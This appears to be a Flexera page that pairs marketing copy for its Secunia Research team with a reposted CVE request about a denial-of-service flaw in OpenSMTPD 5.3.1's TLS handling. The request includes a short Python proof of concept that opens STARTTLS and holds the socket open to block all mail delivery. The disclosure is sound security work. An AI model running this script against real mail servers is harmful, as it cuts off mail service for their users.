How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# CVE Request: DoS in OpenSMTPD TLS Support

---

Hi Kurt,

The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures its
sockets in blocking mode, allowing an attacker to prevent all mail
delivery simply by holding a socket open.

I discovered this accidentally, as I noticed my HP printer's smtp
client would keep the connection indefinitely open after an
unsuccessful authentication attempt, causing no more mail to be
delivered until I SIGKILL'd my smtpd process or unplugged my printer.

The following reproduces the attack trivially:

    #!/usr/bin/env python2
    import smtplib
    import time
    print "[+] Connecting to server and initiating TLS"
    smtp = smtplib.SMTP("mail.some-vitim-host.blah", 587)
    smtp.starttls()
    print "[+] No clients will be able to connect as long as this remains open."
    time.sleep(100000000)

Apparently this was fixed recently upstream, noting "evil client" in
the commit message:
<http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0>

A snapshot has been posted to <http://www.opensmtpd.org/archives/> , but
no patch release has yet been made.

Jason

```
